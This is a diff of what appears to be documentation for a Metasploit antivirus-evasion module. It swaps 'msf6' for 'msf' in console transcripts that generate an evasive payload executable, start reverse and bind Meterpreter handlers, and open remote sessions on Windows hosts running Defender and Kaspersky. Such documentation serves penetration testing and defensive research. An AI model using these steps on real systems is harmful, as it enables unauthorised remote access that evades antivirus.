@@ -41,26 +41,26 @@ Optimization level passed to the compiler (Mingw)
 ## Scenarios
 ### Windows 10 (x64) version 20H2 with Defender
 ```
-msf6 > use evasion/windows/syscall_inject 
+msf > use evasion/windows/syscall_inject 
 [*] Using configured payload windows/x64/meterpreter/reverse_tcp
-msf6 evasion(windows/syscall_inject) > set SLEEP 10000
+msf evasion(windows/syscall_inject) > set SLEEP 10000
 SLEEP => 10000
-msf6 evasion(windows/syscall_inject) > set LHOST 192.168.1.104
+msf evasion(windows/syscall_inject) > set LHOST 192.168.1.104
 LHOST => 192.168.1.104
-msf6 evasion(windows/syscall_inject) > run
+msf evasion(windows/syscall_inject) > run
 
 [+] pYlCSOAeW.exe stored at /Users/user/.msf4/local/pYlCSOAeW.exe
-msf6 evasion(windows/syscall_inject) > cp  /Users/user/.msf4/local/pYlCSOAeW.exe ~
+msf evasion(windows/syscall_inject) > cp  /Users/user/.msf4/local/pYlCSOAeW.exe ~
 [*] exec: cp  /Users/user/.msf4/local/pYlCSOAeW.exe ~
 
-msf6 evasion(windows/syscall_inject) > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.104 -P 4444
+msf evasion(windows/syscall_inject) > handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.1.104 -P 4444
 [*] Payload handler running as background job 1.
 
 [*] Started reverse TCP handler on 192.168.1.104:4444 
-msf6 evasion(windows/syscall_inject) > [*] Sending stage (200262 bytes) to 192.168.1.103
+msf evasion(windows/syscall_inject) > [*] Sending stage (200262 bytes) to 192.168.1.103
 [*] Meterpreter session 3 opened (192.168.1.104:4444 -> 192.168.1.103:53007) at 2021-08-01 17:08:43 +0300
 
-msf6 evasion(windows/syscall_inject) > sessions -i 3 
+msf evasion(windows/syscall_inject) > sessions -i 3 
 [*] Starting interaction with 3...
 
 meterpreter > sysinfo 
@@ -78,29 +78,29 @@ meterpreter > exit
 ```
 ### Windows server 2012 (x64) with Kaspersky 10.2.6.3733
 ```
-msf6 > use evasion/windows/syscall_inject
+msf > use evasion/windows/syscall_inject
 [*] Using configured payload windows/x64/meterpreter/reverse_tcp
-msf6 evasion(windows/syscall_inject) > set payload windows/x64/meterpreter_bind_tcp 
+msf evasion(windows/syscall_inject) > set payload windows/x64/meterpreter_bind_tcp 
 payload => windows/x64/meterpreter_bind_tcp
-msf6 evasion(windows/syscall_inject) > set RHOST 192.168.225.76
+msf evasion(windows/syscall_inject) > set RHOST 192.168.225.76
 RHOST => 192.168.225.76
-msf6 evasion(windows/syscall_inject) > set LPORT 10156
+msf evasion(windows/syscall_inject) > set LPORT 10156
 LPORT => 10156
-msf6 evasion(windows/syscall_inject) > set cipher rc4
+msf evasion(windows/syscall_inject) > set cipher rc4
 cipher => rc4
-msf6 evasion(windows/syscall_inject) > run
+msf evasion(windows/syscall_inject) > run
 
 [+] ShP.exe stored at /Users/medicus/.msf4/local/ShP.exe
-msf6 evasion(windows/syscall_inject) > cp /Users/medicus/.msf4/local/ShP.exe ~
+msf evasion(windows/syscall_inject) > cp /Users/medicus/.msf4/local/ShP.exe ~
 [*] exec: cp /Users/medicus/.msf4/local/ShP.exe ~
 
-msf6 evasion(windows/syscall_inject) > handler -p windows/x64/meterpreter_bind_tcp -H 192.168.225.76 -P 10156
+msf evasion(windows/syscall_inject) > handler -p windows/x64/meterpreter_bind_tcp -H 192.168.225.76 -P 10156
 [*] Payload handler running as background job 0.
 
 [*] Started bind TCP handler against 192.168.225.76:10156
-msf6 evasion(windows/syscall_inject) > [*] Meterpreter session 1 opened (0.0.0.0:0 -> 192.168.225.76:10156) at 2021-08-01 17:32:05 +0300
+msf evasion(windows/syscall_inject) > [*] Meterpreter session 1 opened (0.0.0.0:0 -> 192.168.225.76:10156) at 2021-08-01 17:32:05 +0300
 
-msf6 evasion(windows/syscall_inject) > sessions -i 1 
+msf evasion(windows/syscall_inject) > sessions -i 1 
 [*] Starting interaction with 1...
 
 meterpreter > sysinfo 
